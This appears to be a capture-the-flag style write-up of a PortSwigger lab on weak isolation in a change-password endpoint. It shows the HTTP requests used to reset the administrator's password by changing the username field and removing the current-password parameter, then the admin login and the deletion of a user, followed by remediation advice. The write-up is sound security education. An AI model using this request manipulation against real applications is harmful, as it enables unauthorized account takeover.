# PortSwigger Lab: Weak isolation on dual-use endpoint

# TAGS: Business Logic, Access Control, Password Reset, Burp Suite

Category: Business Logic
Date: October 27, 2026
Day: Tuesday
Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint
Published: Ready
Status: Done

---

## Intro

This lab is part of the Business Logic series. The flaw is a **dual-use endpoint**: the same handler that lets a normal user change their own password is also trusted to manage other accounts. The application takes the target username straight from the request body and treats the current-password check as optional, so I could change the administrator's password without knowing it.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the application makes a flawed assumption about the user's privilege level based on their input, and that the account management features can be exploited to access arbitrary users' accounts. The goal is to access the `administrator` account and delete the user `carlos`.

The lab provides the credentials **wiener:peter**. I logged in and opened `/my-account`:

```http
GET /my-account?id=wiener HTTP/2
Host: 0a53008103730542834c320e009e00e1.web-security-academy.net
Cookie: session=<SESSION>
```

The page has two forms: one to update the email and one to change the password. The change-password form is the interesting one:

```html
<form id=change-password class=login-form action=/my-account/change-password method=POST>
    <input required type="hidden" name="csrf" value="<TOKEN>">
    <label>Username</label>
    <input required name=username value=wiener>
    <label>Current password</label>
    <input required type=password name=current-password>
    <label>New password</label>
    <input required type=password name=new-password-1>
    <label>Confirm new password</label>
    <input required type=password name=new-password-2>
</form>
```

The **username is a form field**, not something the server derives from the session. That is the first hint: if the endpoint trusts this field, I can point it at another user.

---

## Exploitation:

#### Step 1: Capture the change-password request

I filled the form as `wiener` (current password `peter`, new password `123`) and submitted it. The request looked like this:

```http
POST /my-account/change-password HTTP/2
Host: 0a53008103730542834c320e009e00e1.web-security-academy.net
Cookie: session=aIItdGWCTDowhDiNaguoZ7yyoWv6EYHt
Content-Type: application/x-www-form-urlencoded

csrf=KQEX47Dg9nE5Hauf71VDc0wE8jPzZD6f&username=wiener&current-password=peter&new-password-1=123&new-password-2=123
```

The response was the `/my-account` page again — the password was changed normally.

#### Step 2: Change the target user and drop the current-password check

I sent the request to **Repeater** and made two changes:

- set `username=administrator`;
- **removed** the `current-password` parameter entirely.

```http
POST /my-account/change-password HTTP/2
Host: 0a53008103730542834c320e009e00e1.web-security-academy.net
Cookie: session=aIItdGWCTDowhDiNaguoZ7yyoWv6EYHt
Content-Type: application/x-www-form-urlencoded

csrf=KQEX47Dg9nE5Hauf71VDc0wE8jPzZD6f&username=administrator&new-password-1=123&new-password-2=123
```

The server accepted it. Because the `current-password` parameter was absent, the validation was skipped — and because the endpoint used the `username` from the body, the password that changed was the **administrator's**, not mine.

#### Step 3: Log in as administrator and delete carlos

With the administrator's password now set to `123`, I logged in:

```http
POST /login HTTP/2
Host: 0a53008103730542834c320e009e00e1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=qxt5qwAJRm1hF6yudFrBFY0vuRjcWgPr&username=administrator&password=123
```

The login succeeded. I opened `/admin`:

```http
GET /admin HTTP/2
Host: 0a53008103730542834c320e009e00e1.web-security-academy.net
Cookie: session=f6ggkHjDZwQIuoRaCiLcBBbc3Tp2nn1k
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

Users
wiener - Delete
carlos - Delete
```

The delete action is a simple `GET`:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a53008103730542834c320e009e00e1.web-security-academy.net
Cookie: session=f6ggkHjDZwQIuoRaCiLcBBbc3Tp2nn1k
```

After that, the lab showed **"Congratulations, you solved the lab!"**.

---

## Root Cause

The `/my-account/change-password` endpoint has two problems that combine into a privilege escalation:

1. It identifies the account to modify from the **user-controlled `username` parameter** instead of the authenticated session. A normal user is supposed to change only their own password, but nothing ties the parameter to the session.
2. It treats the `current-password` check as **optional**. When the parameter is missing, the validation is skipped instead of failing closed.

So any authenticated user can send a request with `username=administrator` and no `current-password`, and the application will happily set the administrator's password.

---

## Impact

An attacker with a low-privileged account can take over **any other account**, including administrators. In this lab that meant full access to the admin panel and the ability to delete users. In a real application, the same flaw could lead to privilege escalation, account takeover of staff or customers, data exposure, and destructive administrative actions — all from a single, valid low-privileged account.

---

## Remediation

To prevent this issue, applications should:

- Derive the target account from the authenticated session, never from a request parameter;
- Always require and verify the current password (or a strong re-authentication step) for password changes — and fail closed when the field is missing;
- Avoid **dual-use endpoints**: keep self-service actions separate from administrative ones, or enforce explicit role checks on the administrative path;
- Treat every security-relevant parameter as untrusted and validate it server-side against the session and the user's role.

---

## Key Takeaways

1. Dual-use endpoints mix privilege levels — a small parameter change can cross the boundary.
2. Never trust a `username` (or any identifier) from the request for authorization.
3. Try **removing** parameters, not just changing them: a missing check is often the bypass.
4. The change-password form exposed a `username` field, and pointing it at `administrator` gave full admin access.

---

## References

- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Weak isolation on dual-use endpoint (lab)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
